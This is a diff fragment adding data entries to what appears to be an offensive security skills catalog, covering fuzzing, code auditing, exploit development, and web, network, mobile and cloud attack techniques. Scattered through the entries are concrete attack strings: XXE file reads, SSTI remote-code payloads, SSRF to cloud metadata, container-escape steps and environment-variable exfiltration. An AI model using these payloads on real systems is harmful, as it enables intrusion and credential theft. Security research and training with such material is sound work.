+    {n:"031",name:"XML & XXE Injection",badge:"high",diff:2,desc:"XML External Entity injection — read arbitrary files, SSRF, blind OOB via DNS callback",tags:["XXE","XML","SSRF","file-read","OOB"],tools:["Burp Suite","xmllint","xxe-inject"],details:["Classic XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>","Error-based XXE: trigger parse error with %xxe to leak file in error message","OOB/blind XXE: DTD on attacker server — target requests it, sends contents back via DNS","SSRF via XXE: SYSTEM 'http://169.254.169.254/latest/meta-data/' — cloud metadata","Bypass filters: UTF-16 encoding, parameter entities, XML namespaces to evade WAF detection"]},
+  ]
+},
+{
+  id:"fuzzing", title:"Fuzzing & Automated Discovery", sub:"Build fuzzers that find bugs before you do manually",
+  color:"#a855f7", icon:"🔫",
+  skills:[
+    {n:"032",name:"Coverage-Guided Fuzzing (AFL++)",badge:"critical",diff:4,desc:"AFL++ — the industry-standard coverage-guided fuzzer for finding memory corruption in native code",tags:["AFL++","coverage","instrumentation","crash"],tools:["AFL++","afl-cmin","afl-showmap","casr"],details:["Instrument target with afl-gcc/afl-clang-fast — compile-time edge coverage instrumentation","Build corpus: collect valid input samples, minimize with afl-cmin","Run: afl-fuzz -i corpus/ -o findings/ -- ./target @@","Parallel fuzzing: -M master + multiple -S slaves for multi-core utilization","Triage crashes: casr-afl or exploitable plugin — deduplicate and prioritize findings"]},
+    {n:"033",name:"libFuzzer & Fuzz Harness Writing",badge:"critical",diff:4,desc:"Write targeted fuzz harnesses using libFuzzer — attach to library functions directly",tags:["libFuzzer","harness","sanitizers","corpus","LLVMFuzzer"],tools:["clang","libFuzzer","AddressSanitizer","LibFuzzer"],details:["LLVMFuzzerTestOneInput entry point: receive bytes, invoke target API, return 0","Enable ASan+UBSan: -fsanitize=address,undefined for maximum crash detection","Structured fuzzing: use FuzzedDataProvider to construct typed inputs from raw bytes","Corpus management: -use_value_profile for richer coverage, -shrink for minimization","Dictionary files: seed fuzzer with interesting bytes (magic numbers, format delimiters)"]},
+    {n:"034",name:"Kernel Fuzzing (Syzkaller)",badge:"critical",diff:5,desc:"Syscall fuzzer for Linux/BSD kernels — how most modern kernel CVEs are found",tags:["syzkaller","kernel","syscall","syz-prog","coverage"],tools:["syzkaller","KCOV","kASAN","QEMU"],details:["Syzkaller architecture: syz-manager → syz-fuzzer → syz-executor inside QEMU VM","Write syz-lang syscall descriptions for custom drivers/ioctls","Enable kernel coverage (KCOV) and AddressSanitizer (KASAN) in kernel config","Reproduce crashes: syz-repro generates minimal reproducible C program from crash log","Triage with KASAN: use-after-free, heap overflow, stack overflow — all automatically annotated"]},
+    {n:"035",name:"Network Protocol Fuzzing",badge:"high",diff:4,desc:"Fuzz parsers in network-facing services — web servers, DNS, TLS implementations, custom protocols",tags:["protocol-fuzzing","network","Peach","boofuzz","Mutiny"],tools:["boofuzz","Peach","Mutiny","scapy","Sulley"],details:["boofuzz: define protocol grammar in Python, fuzz server over network connection","Target length fields: modify declared lengths to be larger/smaller than actual data","Fuzz field ordering, missing fields, duplicate fields in multi-field protocols","Stateful fuzzing: send valid session setup, then fuzz authenticated operations","Monitor target with SIGFPE/SIGSEGV catching — or watchdog for crash/timeout"]},
+    {n:"036",name:"Symbolic Execution (angr)",badge:"advanced",diff:5,desc:"Explore all paths through a binary using SMT solvers — find inputs that trigger specific code paths",tags:["angr","symbolic","SMT","z3","path-exploration"],tools:["angr","z3","Klee","manticore"],details:["angr Project: load binary, create SimState at entry or function — set symbolic registers/memory","Explore to target address: find all inputs that reach vulnerable sink function","Constrain symbolic inputs: represent file contents, network packets as symbolic bitvectors","Avoid paths: skip non-interesting code to keep state space manageable","Combine with fuzzing: use angr to find complex branch conditions, seed AFL++ corpus"]},
+    {n:"037",name:"Taint Analysis",badge:"advanced",diff:4,desc:"Track user-controlled data flow from source to sink — find injection paths automatically",tags:["taint","dataflow","source","sink","DTA"],tools:["Triton","libdft","taintgrind","Dytan"],details:["Mark attacker-controlled bytes as tainted at network read/recv/fread syscall","Track taint propagation through arithmetic, memory copies, string operations","Alert when tainted byte reaches dangerous sink: strcpy/sprintf dest, system() arg, SQL query","Binary-level taint with Triton: DBI on top of Pin/DynamoRIO for any compiled target","Source code taint with CodeQL: taint tracking queries for web framework sources/sinks"]},
+    {n:"038",name:"Grammar-Based & Generative Fuzzing",badge:"high",diff:4,desc:"Generate syntactically valid but semantically malformed inputs for structured formats",tags:["grammar","generative","domato","radamsa","structures"],tools:["domato","radamsa","Peach","grammarinator"],details:["Grammar definition: define target format (HTML, JS, PDF) using BNF-like rules","domato: Google's DOM fuzzer — generates valid-looking but semantically weird JavaScript","Radamsa: black-box mutation fuzzer — good for quick results without instrumentation","Generational vs mutational: generational explores format space, mutational extends good seeds","PDF/Office/image format fuzzing: generate valid container with malformed embedded data"]},
+    {n:"039",name:"Fuzzer Development & Custom Mutators",badge:"advanced",diff:5,desc:"Write custom AFL++ mutators and fuzzer plugins for targets with complex input requirements",tags:["mutator","AFL++","custom-fuzzer","Python","Rust"],tools:["AFL++","python-mutators","Rust","libfuzzer-sys"],details:["AFL++ custom mutator API (Python): havoc_mutation, pre_save_buffer, post_process","Structure-aware mutation: parse input, mutate specific fields, reserialize — avoid rejections","Write LLVM passes for better coverage instrumentation on specific target code patterns","Corpus distillation: prune redundant seeds that add no new coverage edges","Crash deduplication: ASan symbolized stack + hash — avoid re-analyzing same bug twice"]},
+  ]
+},
+{
+  id:"code-audit", title:"Source Code Auditing", sub:"Manual and automated source code review to find vulnerabilities before compilation",
+  color:"#22c55e", icon:"🔍",
+  skills:[
+    {n:"040",name:"CodeQL Vulnerability Queries",badge:"critical",diff:4,desc:"GitHub's semantic code analysis engine — write queries to find vulnerability classes at scale across codebases",tags:["CodeQL","SAST","QL","dataflow","taint"],tools:["CodeQL","codeql-cli","GitHub Advanced Security"],details:["Write taint-tracking queries: define source (user input), sink (dangerous function), track flow","Run against entire GitHub repos: codeql database create + codeql query run","Find variant bugs: after finding CVE, write query to find similar patterns in same/related code","Built-in queries: SQL injection, SSRF, command injection, path traversal — customize for targets","QL dataflow library: DataFlow::Node, TaintTracking::Configuration — extend for custom sources/sinks"]},
+    {n:"041",name:"Semgrep Pattern Matching",badge:"core",diff:2,desc:"Fast, lightweight SAST tool — define patterns to find dangerous code in any language",tags:["semgrep","pattern","SAST","regex","rule"],tools:["semgrep","semgrep-rules","semgrep-live"],details:["Pattern syntax: match function calls, variable assignments, control flow patterns","Write rules for dangerous functions: system(), exec(), eval() with non-literal args","Cross-file analysis: track data from one file to another across function calls","Run against open source: semgrep --config=p/r2c-security-audit /path/to/repo","Community ruleset: p/owasp-top-ten — run immediately on any target for quick findings"]},
+    {n:"042",name:"Manual C/C++ Code Review",badge:"critical",diff:5,desc:"Systematic audit of C/C++ source code for memory corruption, integer bugs, race conditions",tags:["manual","audit","C++","systematic","grep"],tools:["grep","ripgrep","cscope","ctags","bear"],details:["Establish code navigation: ctags/cscope for jump-to-definition, call graph traversal","Target dangerous functions first: grep for strcpy/sprintf/memcpy/strcat without length","Follow data flow manually from user input: recv() → ... → vulnerable sink","Check all integer operations on sizes: multiplications before malloc, subtractions before loop","Look for missing mutex locks: shared data structures accessed from multiple threads"]},
+    {n:"043",name:"PHP/Python/Ruby Code Audit",badge:"high",diff:3,desc:"Web application source code audit — find injection points, auth bypasses, insecure deserialization",tags:["PHP","Python","Ruby","web","RCE","LFI"],tools:["RIPS","progpilot","semgrep","grep"],details:["PHP: track $_GET/$_POST/$_REQUEST from input to echo/print/eval/system/include","Python: identify eval()/exec()/os.system()/subprocess with user input","Ruby: find send() with user-controlled method name — universal gadget","Template injection: Jinja2/Twig/Smarty — trace user input into template.render()","Insecure direct object reference: numeric IDs in queries without authorization check"]},
+    {n:"044",name:"JavaScript/Node.js Code Audit",badge:"high",diff:3,desc:"Audit modern JS/Node.js applications — prototype pollution, SSRF, ReDoS, injection",tags:["JavaScript","Node.js","prototype-pollution","SSRF","ReDoS"],tools:["eslint-security","njsscan","snyk","Burp"],details:["Prototype pollution: _.merge/_.extend/Object.assign with user keys containing __proto__","Client-side template injection: Angular/Vue/React — track user input to template compilation","SSRF in Node: http.request()/axios.get() with user-controlled URL — internal service access","ReDoS: complex regex with user input — catastrophic backtracking on malicious string","Injection via child_process.exec()/spawn(shell:true) with user-controlled arguments"]},
+    {n:"045",name:"Go / Rust Security Audit",badge:"high",diff:4,desc:"Audit memory-safe languages for their unique vulnerability patterns — logic flaws, unsafe blocks, concurrency",tags:["Go","Rust","unsafe","goroutine","race"],tools:["gosec","cargo-audit","staticcheck","racechecker"],details:["Go: goroutine races — use go test -race to detect data races in concurrent code","Go: integer overflow in slice operations — len() returns int, can overflow on 32-bit","Rust unsafe blocks: raw pointer derefs, foreign function interface — audit every unsafe{}","Go: TOCTOU in os.Stat() followed by os.Open() — symlink race on file operations","Go: fmt.Sprintf() with %!s(MISSING) — format string confusion (not exploitable but buggy)"]},
+    {n:"046",name:"Cryptographic Weakness Identification",badge:"high",diff:4,desc:"Identify weak crypto, timing oracles, padding oracle, IV reuse, and key management flaws",tags:["crypto","timing","oracle","padding","ECB","IV-reuse"],tools:["cryptography","hashpump","padding-oracle-py"],details:["ECB mode: identical plaintext blocks produce identical ciphertext — detect by repeated blocks","CBC padding oracle: manipulate ciphertext to trigger/suppress padding error — decrypt any data","IV reuse with CTR/GCM: same IV+key pair destroys confidentiality and integrity","Timing oracle: HMAC comparison using == vs hmac.compare_digest — timing side channel","Weak RNG: Math.random() in JS, random() in C — predictable for crypto key generation"]},
+  ]
+},
+{
+  id:"exploit-dev", title:"Exploit Development", sub:"Turn bug primitives into reliable, weaponized proof-of-concepts",
+  color:"#ef4444", icon:"💣",
+  skills:[
+    {n:"047",name:"ROP Chain Construction",badge:"critical",diff:5,desc:"Return-Oriented Programming — chain existing code gadgets to execute arbitrary operations without new code",tags:["ROP","gadgets","ASLR","NX","ret2libc"],tools:["ROPgadget","ropper","pwntools","one_gadget"],details:["Find gadgets: ROPgadget --binary target --rop — search for pop/ret sequences","ret2libc: return to system('/bin/sh') — need to leak libc base first via info leak","ret2plt: call PLT stub of puts() to leak GOT address, calculate libc offset, call system()","Stack pivot: control RSP to point at controlled memory — useful when stack space limited","one_gadget: find magic gadgets in libc that call execve('/bin/sh') with single return"]},
+    {n:"048",name:"Heap Exploitation Techniques",badge:"critical",diff:5,desc:"Modern heap exploitation: tcache poisoning, fastbin dup, house-of-techniques for CTF and real targets",tags:["heap","tcache","fastbin","house-of","glibc"],tools:["pwndbg","pwntools","heapinspect"],details:["Tcache poisoning: corrupt tcache->next — malloc returns arbitrary address on 2nd alloc","Fastbin dup: double-free in fastbin — create loop, get malloc to return any address","House of Spirit: free fake chunk — get malloc to return target address","House of Force: overwrite top chunk size to huge — allocate to any address","Safe linking (glibc 2.32+): fd XOR'd with heap addr>>12 — leak heap ptr to calculate key"]},
+    {n:"049",name:"Kernel Exploit Development",badge:"critical",diff:5,desc:"Exploit kernel vulnerabilities for local privilege escalation — the pinnacle of exploit development",tags:["kernel","LPE","commit_creds","kernel-ROP","ret2usr"],tools:["pwntools","kernel-pwn","syzkaller","QEMU"],details:["Basic LPE flow: trigger kernel bug → corrupt cred struct → set uid/gid=0 → shell","commit_creds(prepare_kernel_cred(0)): classic null deref / UAF LPE technique","SMEP bypass: can't execute userspace pages in kernel — use kernel ROP chain instead","SMAP bypass: can't read/write userspace in kernel — copy_from/to_user gadgets","KPTI (Meltdown mitigation): swapgs_restore_regs_and_return_to_usermode gadget for clean return"]},
+    {n:"050",name:"Browser Exploitation",badge:"critical",diff:5,desc:"Exploit JavaScript engine bugs in Chrome V8, Firefox SpiderMonkey — the hardest exploit class",tags:["browser","V8","SpiderMonkey","JIT","sandbox"],tools:["d8","SpiderMonkey shell","pwndbg","turbolizer"],details:["V8 addrOf primitive: trick JIT into treating JSObject as float64 — read its compressed pointer","V8 fakeObj primitive: plant a fake JSObject at known memory — forge internal v8 object layout","TurboFan type confusion: incorrect type feedback → JIT assumes wrong type → OOB access","ArrayBuffer backing store overwrite: control what memory a TypedArray reads/writes","Sandbox escape: gain renderer code exec → escape via Mojo IPC bug → full system compromise"]},
+    {n:"051",name:"Mitigation Bypass Techniques",badge:"critical",diff:5,desc:"Bypass modern exploit mitigations: ASLR, PIE, NX/DEP, stack canaries, CFI, CET",tags:["ASLR","PIE","CFI","CET","canary","shadow-stack"],tools:["pwntools","ROPgadget","one_gadget"],details:["ASLR bypass: info leak via format string/OOB read to reveal loaded addresses at runtime","Stack canary bypass: leak canary via format string, brute force in forking server","NX/DEP bypass: ROP chain — no need for executable stack or heap","CFI bypass: still use valid targets — indirect call table, vtable dispatch confusion","Intel CET (shadow stack): must hijack return via shadow stack corruption or JOP/COP chains"]},
+    {n:"052",name:"Sandbox Escape Techniques",badge:"advanced",diff:5,desc:"Escape browser sandboxes, container breakouts, VM escapes — from restricted env to full system",tags:["sandbox","escape","container","browser","VM"],tools:["cgroups","seccomp-bpf","namespaces","QEMU"],details:["Browser sandbox: exploit Mojo IPC interface from renderer to broker process","Docker escape: privileged container + /proc/sysrq-trigger, mounted docker.sock","cgroups v1 release_agent: write shell command to notify-on-empty handler — host exec","seccomp bypass: find allowed syscall that enables other syscalls (ptrace, keyctl, etc.)","QEMU/VMware VM escape: exploit virtual device driver (virtio, VMSVGA, e1000) from guest"]},
+    {n:"053",name:"Shellcode Development",badge:"high",diff:4,desc:"Write position-independent shellcode for various architectures — staged, stageless, custom payloads",tags:["shellcode","PIC","syscalls","msfvenom","x64"],tools:["pwntools asm","msfvenom","keystone","nasm"],details:["x64 Linux: execve('/bin/sh') via syscall instruction — push string on stack, RAX=59","Avoid bad bytes: NUL bytes, newlines, specific sequences that corrupt buffer delivery","Position-independent: use RIP-relative addressing or call/pop to locate code address","Custom shellcode for specific tasks: add user to /etc/passwd, create SUID shell, reverse shell","Encode shellcode to bypass detection: XOR encode, avoid pattern signatures, use polymorphism"]},
+  ]
+},
+{
+  id:"web-zero-days", title:"Web Application Zero-Days", sub:"Advanced web vulnerability research beyond basic OWASP Top 10",
+  color:"#06b6d4", icon:"🌐",
+  skills:[
+    {n:"054",name:"HTTP Request Smuggling",badge:"critical",diff:4,desc:"Exploit discrepancies between frontend and backend HTTP parsing to poison request queues",tags:["smuggling","CL.TE","TE.CL","HTTP/2","HAProxy"],tools:["Burp HTTP Smuggler","smuggler.py","turbo-intruder"],details:["CL.TE: frontend uses Content-Length, backend uses Transfer-Encoding — split requests","TE.CL: frontend uses Transfer-Encoding, backend uses Content-Length — reverse split","HTTP/2 downgrade: send H2 request that becomes malformed HTTP/1.1 at backend","CONNECT tunneling: abuse proxy CONNECT method to reach internal services","Impact chain: bypass WAF, steal other users' requests, cache poisoning, SSRF to internal"]},
+    {n:"055",name:"Server-Side Template Injection",badge:"critical",diff:3,desc:"Code execution via template engine injection — Jinja2, Twig, Freemarker, Pebble, Velocity",tags:["SSTI","Jinja2","Twig","Freemarker","RCE"],tools:["tplmap","Burp Suite","manual"],details:["Detection: {{7*7}} → 49 = Jinja2/Twig, ${7*7} → 49 = FreeMarker/Velocity, #{7*7} = Ruby ERB","Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}","Twig (PHP) RCE: {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}","Freemarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}","Sandbox bypass: walk Python MRO to find builtins without obvious keywords"]},
+    {n:"056",name:"OAuth & JWT Attacks",badge:"high",diff:3,desc:"Attack OAuth 2.0 flows and JWT implementation flaws — token theft, algorithm confusion, PKCE bypass",tags:["OAuth","JWT","alg:none","PKCE","redirect_uri"],tools:["jwt_tool","Burp","jwt.io"],details:["JWT alg:none: change algorithm to 'none', remove signature — server accepts unsigned token","JWT RS256→HS256 confusion: sign with server's public key as HMAC secret — forge any JWT","Open redirect in redirect_uri: steal auth code via malicious redirect_uri parameter","PKCE downgrade: remove code_challenge — revert to classic code interception attack","Improper state validation: CSRF on OAuth flow — attacker's code flows to victim's session"]},
+    {n:"057",name:"SSRF Advanced Techniques",badge:"critical",diff:4,desc:"Server-Side Request Forgery chaining — reach internal services, cloud metadata, LDAP, Gopher",tags:["SSRF","Gopher","cloud","metadata","LDAP"],tools:["interactsh","SSRFmap","Gopherus"],details:["Cloud metadata: AWS 169.254.169.254 → IAM credentials → full AWS account access","Gopher protocol: craft raw TCP bytes — attack MySQL, Redis, Memcached, LDAP via SSRF","SSRF + Redis: SET key value via Gopher — write webshell to web directory","Blind SSRF: use interactsh/Burp Collaborator for OOB DNS/HTTP callbacks","Bypass filters: 0177.0.0.1, 0x7f000001, localhost→resolved IP, IPv6 ::1, shortened URLs"]},
+    {n:"058",name:"Web Cache Poisoning",badge:"high",diff:4,desc:"Poison shared cache entries to serve malicious content to all users — unkeyed header injection",tags:["cache-poisoning","X-Forwarded-Host","unkeyed","CDN","Cloudflare"],tools:["Burp Cache Poisoning","param-miner","manual"],details:["Identify unkeyed headers: X-Forwarded-Host, X-Host — reflected in response but not cache key","Poison cache with XSS: inject JS via unkeyed header — served to all subsequent visitors","Web cache deception: force caching of user-specific pages via path normalization tricks","Fat GET request: cache stores GET body parameters — pollute next response with your body","Vary header analysis: identify which request headers are cache-keyed vs ignored"]},
+    {n:"059",name:"GraphQL Security Testing",badge:"high",diff:3,desc:"Audit GraphQL APIs — introspection abuse, batch injection, IDOR via node IDs, query depth attacks",tags:["GraphQL","introspection","batch","IDOR","depth"],tools:["InQL","graphql-cop","Burp","altair"],details:["Introspection query: dump entire schema — find hidden queries, mutations, types","Batch query injection: send 100 mutations in one request — bypass rate limiting","IDOR via global node IDs: base64-decode node IDs to find internal object types","Query depth attack: deeply nested query causing N+1 DB queries — DoS server","SQL injection in resolver: GraphQL doesn't sanitize — inject in field arguments"]},
+    {n:"060",name:"Prototype Pollution to RCE",badge:"critical",diff:4,desc:"Pollute Object.prototype in Node.js to inject properties into all objects — escalate to RCE",tags:["prototype-pollution","Node.js","RCE","child_process","template"],tools:["pp-finder","nodejsscan","manual"],details:["Server-side: pollute __proto__.shell='bash' → child_process.spawn uses shell → RCE","Template engine escalation: pollute template engine options (outputFunctionName in EJS)","Express.js + lodash.merge: POST body with __proto__ key — pollutes global Object prototype","Detection: send {\"__proto__\":{\"json spaces\":10}} — if JSON pretty-printed, pollution confirmed","Gadget hunting: search codebase for unsafe uses of prototype-polluted properties (opts.shell etc.)"]},
+    {n:"061",name:"Insecure Direct Object Reference (IDOR)",badge:"high",diff:2,desc:"Access other users' data by manipulating object identifiers — GUIDs, encoded IDs, hashed IDs",tags:["IDOR","BOLA","auth","object-reference"],tools:["Burp Intruder","Autorize","manual"],details:["Numeric sequential IDs: increment/decrement to access adjacent records","GUID enumeration: UUIDv1 time-based — predict adjacent GUIDs from known one","Hash-based IDs: MD5(userid) — hash known values, try common inputs","Indirect IDOR: visible ID maps to different internal ID — observe both and swap","Chained IDOR: read email via IDOR → use email in password reset → full account takeover"]},
+    {n:"062",name:"Web Timing Attacks",badge:"high",diff:4,desc:"Exploit timing differences to leak data — user enumeration, oracle attacks, cache timing",tags:["timing","oracle","side-channel","Fetch-API","portswigger"],tools:["Burp Intruder","turbo-intruder","fetch-api"],details:["User enumeration: login with valid vs invalid username — response time difference","Padding oracle via timing: AES-CBC decryption time differs based on padding validity","Cache timing: same-origin timing via Fetch API — detect if URL cached (fast) or not (slow)","Cross-site timing: measure response time to leak info about other-origin page contents","Connection pool timing: saturate pool, time next request — leak victim's session state"]},
+  ]
+},
+{
+  id:"network-zero-days", title:"Network & Protocol Research", sub:"Find zero-days in network stacks, protocols and infrastructure",
+  color:"#f59e0b", icon:"📡",
+  skills:[
+    {n:"063",name:"TCP/IP Stack Auditing",badge:"high",diff:5,desc:"Audit kernel TCP/IP implementation — TCP ISN prediction, fragment reassembly, option handling",tags:["TCP/IP","kernel","fragment","ISN","option"],tools:["Scapy","pktgen","kernel-source"],details:["Fragment reassembly: overlapping fragments handled differently — inject malicious content","TCP option parsing: excessive options, malformed lengths — kernel parser overflow","ISN randomization audit: predict sequence numbers on weak PRNG implementations","RST injection: inject RST with predicted sequence number — tear down legitimate connections","Selective ACK (SACK) handling: scoreboard corruption — kernel memory corruption via TCP options"]},
+    {n:"064",name:"TLS/SSL Implementation Attacks",badge:"critical",diff:4,desc:"Attack TLS implementations — BEAST, CRIME, POODLE, Heartbleed class bugs in TLS libraries",tags:["TLS","OpenSSL","Heartbleed","BEAST","cipher"],tools:["testssl.sh","sslscan","tlsfuzzer","Scapy"],details:["tlsfuzzer: grammar-based fuzzer for TLS — sends malformed handshake messages","Record layer parsing: off-by-one in length field parsing — buffer overflow (Heartbleed class)","CBC padding oracle: POODLE/BEAST — exploit CBC padding behavior to decrypt sessions","Downgrade attacks: DROWN (SSLv2 oracle), FREAK (export RSA), Logjam (DH 512-bit)","Certificate validation bypass: CN wildcard tricks, null byte in CN, SANs vs CN priority"]},
+    {n:"065",name:"DNS Protocol Vulnerabilities",badge:"high",diff:4,desc:"DNS poisoning, zone transfer, resolver bugs, DNSSEC bypass, DNS tunneling detection bypass",tags:["DNS","poisoning","DNSSEC","resolver","Kaminsky"],tools:["dnsdiag","dnschef","dns-fuzzer","Scapy"],details:["Kaminsky attack: flood resolver with forged answers — poison cache with malicious record","DNS rebinding: resolve attacker.com to 127.0.0.1 — bypass same-origin policy protection","DNSSEC implementation flaws: audit signature validation, key rollover, NSEC3 walking","Resolver bugs: CNAME chain loop, label compression pointer cycles — DoS or memory corruption","DNS-over-HTTPS bypass: find CDN edge servers that leak original IP or support DoH downgrade"]},
+    {n:"066",name:"SMB/Kerberos Protocol Research",badge:"critical",diff:4,desc:"Windows network protocol vulnerabilities — EternalBlue class, Kerberos delegation, relay attacks",tags:["SMB","Kerberos","relay","delegation","PrintSpooler"],tools:["impacket","Responder","ntlmrelayx","BloodHound"],details:["SMB signing disabled: NTLM relay — capture auth, relay to target, authenticate as victim","Kerberoasting: request TGS for SPN account — offline crack service account NTLM hash","AS-REP Roasting: accounts with no pre-auth required — request AS-REP, crack offline","Unconstrained delegation: machine/service with delegation flag — steal TGT from incoming auth","PrintSpooler coercion: force Windows to authenticate back to attacker — capture and relay NTLM"]},
+    {n:"067",name:"VPN & Tunnel Protocol Audit",badge:"high",diff:4,desc:"Audit IPsec, WireGuard, OpenVPN, L2TP implementations for cryptographic and implementation flaws",tags:["IPsec","WireGuard","OpenVPN","IKE","crypto"],tools:["ike-scan","ikeforce","openvpn-audit"],details:["IKE aggressive mode: probe for supported transforms, off-line crack with PSK if used","IPsec implementation fuzzing: malformed IKE_SA_INIT packets — audit parser in strongSwan/OpenSwan","WireGuard: audit Noise protocol implementation — key generation, handshake timing","OpenVPN: audit TLS-crypt-v2 key generation, user-pass validation bypass","Split tunneling leak: traffic destined for attacker.com leaks outside VPN if split tunnel configured"]},
+    {n:"068",name:"Industrial Protocol Security (ICS/SCADA)",badge:"high",diff:4,desc:"Modbus, DNP3, BACnet, PROFINET — ICS protocols with zero authentication by design",tags:["ICS","SCADA","Modbus","DNP3","PLC"],tools:["Redpoint NSE","plcscan","modscan","ISF"],details:["Modbus: no authentication — read/write coils and registers by sending raw Modbus PDU","DNP3: spoofed source address — inject commands into communication stream","BACnet: broadcast-based discovery — enumerate all devices, read all properties","Siemens S7: S7comm proprietary protocol — block read/write, PLC stop command","Replay attacks: record valid ICS commands, replay to trigger unauthorized actions"]},
+  ]
+},
+{
+  id:"mobile-zero-days", title:"Mobile & Embedded Zero-Days", sub:"iOS, Android, and embedded device vulnerability research",
+  color:"#ec4899", icon:"📱",
+  skills:[
+    {n:"069",name:"Android Binder IPC Auditing",badge:"critical",diff:5,desc:"Android's core IPC mechanism — audit Binder transaction handling in system services for LPE",tags:["Android","Binder","AIDL","IPC","system-service"],tools:["Frida","adb","jadx","Ghidra"],details:["Binder transaction: identify AIDL interfaces in system_server, media server, surfaceflinger","Integer overflow in parcel reading: Parcel.readInt() used for array size — allocate too small","Type confusion in Binder: write Parcelable of type A, read as type B — field confusion","Missing permission check: Binder call reachable from zero-permission app — privilege escalation","Audit with Frida: hook binder transaction handlers — monitor all IPCs from target service"]},
+    {n:"070",name:"iOS Kernel Exploitation",badge:"critical",diff:5,desc:"XNU kernel vulnerabilities — IOKit driver bugs, Mach port UAF, sandbox escape on iOS",tags:["iOS","XNU","IOKit","Mach","PAC","sandbox"],tools:["Frida","iphone-backup-analyzer","checkra1n","Corellium"],details:["IOKit driver attack surface: enumerate with IOServiceGetMatchingServices, fuzz IOUserClient methods","Mach port reference counting: race condition in port rights — use-after-free in mach_port_destroy","iOS PAC (pointer authentication): bypass via kernel read primitive to find signed pointers","Sandbox escape: find IOKit service reachable from sandboxed app — lateral move to kernel","tfp0 primitive: task for PID 0 (kernel task) — gives kernel read/write via vm_read/vm_write"]},
+    {n:"071",name:"Android APK Reverse Engineering",badge:"core",diff:2,desc:"Decompile, analyze and audit Android APKs for logic flaws, hardcoded secrets, insecure IPC",tags:["Android","APK","jadx","smali","intent"],tools:["jadx","apktool","MobSF","frida","objection"],details:["jadx: decompile APK to readable Java — analyze app logic, find hardcoded keys/URLs","Exported activities/services/receivers: adb can trigger them — bypass auth, access private data","Intent injection: user-controlled Intent extras used in startActivity — open arbitrary activities","WebView JavaScript bridge: addJavascriptInterface — pre-4.2 RCE, post-4.2 audit annotated methods","Content provider SQL injection: query(uri, projection, selection, ...) with user-controlled args"]},
+    {n:"072",name:"Firmware Vulnerability Research",badge:"high",diff:5,desc:"Find zero-days in router, camera, printer firmware — stack overflows in web UI, hardcoded creds, RCE",tags:["firmware","router","IoT","embedded","RTOS"],tools:["binwalk","firmwalker","Ghidra","QEMU","OpenWRT"],details:["Extract firmware: binwalk -e firmware.bin — extract squashfs, initramfs, CPIO archives","Emulate: QEMU + Firmadyne for ARM/MIPS routers — run firmware without physical device","Web interface audit: httpd on port 80/443 — common: stack overflow in form field parsing","Command injection in ping/traceroute: ; after IP address — standard router RCE pattern","Hardcoded credentials: strings firmware.bin | grep -i 'password\\|passwd\\|secret\\|key'"]},
+    {n:"073",name:"Bluetooth & BLE Security Research",badge:"high",diff:4,desc:"Audit Bluetooth protocol stack — BlueBorne class, BLE pairing flaws, implementation bugs in BlueZ",tags:["Bluetooth","BLE","BlueZ","pairing","KNOB"],tools:["bettercap","btlejuice","BlueMaho","Wireshark"],details:["BlueBorne: BNEP protocol in BlueZ — heap overflow without pairing required","KNOB attack: downgrade Bluetooth entropy to 1 byte — brute force session key","BLE pairing: Just Works = no MITM protection — inject pairing packet to MITM connection","SMP protocol: fuzz PDU fields, length values — memory corruption in pairing state machine","Information disclosure: BLE advertisements expose MAC address, device type, firmware version"]},
+  ]
+},
+{
+  id:"cloud-zero-days", title:"Cloud & Container Research", sub:"Cloud misconfiguration, container escape, and serverless security research",
+  color:"#22c55e", icon:"☁️",
+  skills:[
+    {n:"074",name:"AWS IAM Privilege Escalation",badge:"critical",diff:4,desc:"Escalate privileges in AWS using misconfigured IAM policies — PassRole, CreatePolicyVersion, Lambda abuse",tags:["AWS","IAM","privilege-escalation","passrole","lambda"],tools:["pacu","cloudsploit","aws-privesc-scanner","pmapper"],details:["iam:PassRole + ec2:RunInstances: launch instance with admin role — get credentials from metadata","iam:CreatePolicyVersion: add new policy version with * permissions on any policy you manage","lambda:UpdateFunctionCode: update Lambda function with code that exfiltrates env vars","sts:AssumeRole with wildcard conditions: cross-account role assumption without MFA requirement","CloudFormation ROLLBACK: abuse stack rollback to re-execute previous privileged template"]},
+    {n:"075",name:"Kubernetes Security Research",badge:"critical",diff:5,desc:"Audit Kubernetes clusters — RBAC bypasses, etcd access, container escape, API server misconfigs",tags:["Kubernetes","k8s","RBAC","etcd","ServiceAccount"],tools:["kube-hunter","peirates","CDK","kubescape"],details:["Service account token: mounted at /var/run/secrets/kubernetes.io/serviceaccount/token — check permissions","RBAC wildcard: rules with verb=* or resource=* — enumerate what SA can do","Etcd access: curl https://etcd:2379/v2/keys — read all secrets if exposed without auth","Privileged pod: --privileged flag + hostPID/hostNetwork — full node access from container","SSRF to metadata: from compromised pod, reach 169.254.169.254 for cloud IAM credentials"]},
+    {n:"076",name:"Container Escape Techniques",badge:"critical",diff:5,desc:"Break out of Docker/containerd containers via privileged mode, mounted sockets, kernel bugs",tags:["container","escape","Docker","privileged","cgroups"],tools:["CDK","deepce","amicontained"],details:["Docker socket mounted: docker.sock visible in container — create new privileged container, escape","Privileged mode: mount host filesystem — chroot into /host, write to /etc/passwd, SUID shell","cgroups v1 release_agent: echo command to notify_on_release handler — executed on host as root","Kernel exploit from container: exploit kernel bug — no namespace/cgroup restriction on kernel bugs","CAP_SYS_ADMIN: multiple techniques — mount, ptrace host processes, debug host kernel modules"]},
+    {n:"077",name:"Serverless & Lambda Security",badge:"high",diff:3,desc:"Serverless function security — environment variable leaks, event injection, over-permissive IAM roles",tags:["serverless","Lambda","environment","IAM","event-injection"],tools:["Pacu","aws-cli","postman","manual"],details:["Environment variable exfiltration: SSRF or RCE in Lambda — curl metadata + env vars","Event injection: Lambda triggered by untrusted events (SQS, S3 key, API GW params) — SQLI/SSTI","IAM role audit: Lambda execution role with overly broad permissions — escalate via role","Cold start timing: Lambda cold start behavior differences — information disclosure via timing","Dependency confusion: Lambda pulling packages at runtime — inject malicious package"]},
+  ]
+},
+{
+  id:"osint-recon", title:"OSINT & Attack Surface Discovery", sub:"Find targets, enumerate attack surface, and gather intelligence before touching the target",
+  color:"#3b82f6", icon:"👁️",
+  skills:[
